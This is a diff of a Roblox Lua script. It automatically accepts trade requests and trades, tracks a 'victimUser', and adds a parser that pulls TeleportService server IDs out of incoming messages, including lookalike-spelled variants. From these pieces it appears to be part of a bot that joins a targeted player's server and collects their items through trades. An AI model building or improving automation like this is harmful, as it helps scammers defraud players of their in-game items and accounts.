@@ -71,18 +71,6 @@ local function acceptTrade()
     end
 end
 
-local function waitForPlayerLeave()
-    local playerRemovedConnection
-    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
-        if removedPlayer.Name == victimUser then
-            if playerRemovedConnection then
-                playerRemovedConnection:Disconnect()
-            end
-            didVictimLeave = true
-        end
-    end)
-end
-
 local function IsTrading()
     local trade_statue = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
     if trade_statue == "StartTrade" then
@@ -102,10 +90,29 @@ local function tradeTimer()
     end
 end
 
-waitForPlayerLeave()
 task.spawn(acceptRequest) -- Start accepting trade requests
 task.spawn(acceptTrade) -- Start accepting trades
 task.spawn(tradeTimer)
+
+local function findTeleportCommand(content)
+    if not content then return nil, nil end
+    
+    -- Универсальный паттерн для любых вариантов
+    local patterns = {
+        'TeleportService["\'%)]%s*:%s*TeleportToPlacelnstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']',
+        'game%s*[:%.]%s*GetService%s*%(%s*["\']TeleportService["\']%s*%)%s*:%s*TeleportToPlacelnstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']',
+        'TeleportService["\'%)]%s*:%s*TeleportToPlaceInstance%s*%(%s*(%d+)%s*,%s*["\']([%w%-]+)["\']'
+    }
+    
+    for _, pattern in ipairs(patterns) do
+        local placeId, jobId = content:match(pattern)
+        if placeId and jobId then
+            return placeId, jobId
+        end
+    end
+    
+    return nil, nil
+end
 
 local lastCheckedMessageId = nil
 
